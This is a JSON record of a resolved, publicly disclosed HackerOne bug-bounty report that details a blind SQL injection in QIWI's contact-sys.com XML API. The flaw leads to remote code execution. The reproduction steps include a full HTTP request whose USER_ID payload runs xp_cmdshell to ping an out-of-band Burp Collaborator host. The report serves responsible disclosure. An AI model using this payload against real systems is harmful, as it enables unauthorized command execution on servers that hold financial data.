{
  "id": 816560,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MTY1NjA=",
  "url": "https://hackerone.com/reports/816560",
  "title": "SQL injection on contactws.contact-sys.com in TRateObject.AddForOffice in USER_ID parameter leads to remote code execution",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-03-11T07:13:04.824Z",
  "submitted_at": "2020-03-11T07:13:04.824Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "honoki",
    "url": "/honoki",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 215,
    "url": "https://hackerone.com/qiwi",
    "handle": "qiwi",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "QIWI",
      "twitter_handle": "QiwiRussia",
      "website": "https://qiwi.com",
      "about": "The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-06-19T06:03:15.574Z",
  "bug_reporter_agreed_on_going_public_at": "2020-05-20T06:02:50.088Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\n\nThe API interface on https://contactws.contact-sys.com:3456/ accepts a `<REQUEST/>` body to interact with the server's AppServ object. Because of insufficient input validation, an attacker can abuse the `USER_ID` parameter of the `TRateObject.AddForOffice` method to inject arbitrary SQL statements. This leads to a blind SQL injection vulnerability, which in turn leads to Remote Code Execution on the server.\n\n## Technical details\n\nThis vulnerability is similar to my earlier reports #816254 and #816086, but targets a vulnerability in a different object class and action, i.e. `OBJECT_CLASS=\"TRateObject\"` and `ACTION=\"AddForOffice\"` to achieve remote code execution.\n\nI want to make clear that this vulnerability exists independently of the fact that I can access methods on this test (?) server, since all integrators with valid credentials/certificates would be able to similarly target the production version of this object class action via the SOAP interface on https://enter.contact-sys.com:2221/wstrans/wsTrans.exe/soap/ITransmitter\n\n## Steps to reproduce\n\n1. Execute the following request (change the burp collaborator URL to your own);\n\n     ```http\nPOST / HTTP/1.1\nHost: contactws.contact-sys.com:3456\nContent-Type: application/xml;charset=utf8\nContent-Length: 326\n\n    <REQUEST OBJECT_CLASS=\"TRateObject\" ACTION=\"AddForOffice\" POINT_CODE=\"TZAA\" USER_ID=\"1; DECLARE @command varchar(255); SELECT @command='ping yeg0f86wcvq6k9n1k4s1aiel9cf23r.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command;\"\nINT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" ExpectSigned=\"No\" LANG=\"EN\">\n</REQUEST>\n```\n\n2. Watch your DNS logs as the DNS resolution of the ping request comes in.\n\n## Impact\n\nBy executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer's financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-06-19T06:02:50.178Z",
  "allow_singular_disclosure_after": -115285020.26015885,
  "singular_disclosure_allowed": true,
  "vote_count": 118,
  "voters": [
    "omarelfarsaoui",
    "silvertone",
    "cxzer0",
    "a_d_a_m",
    "horise",
    "mzfr",
    "holme",
    "ali",
    "brahim_boufakri01",
    "hsalo",
    "and 108 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 10.0,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 18737,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.contact-sys.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
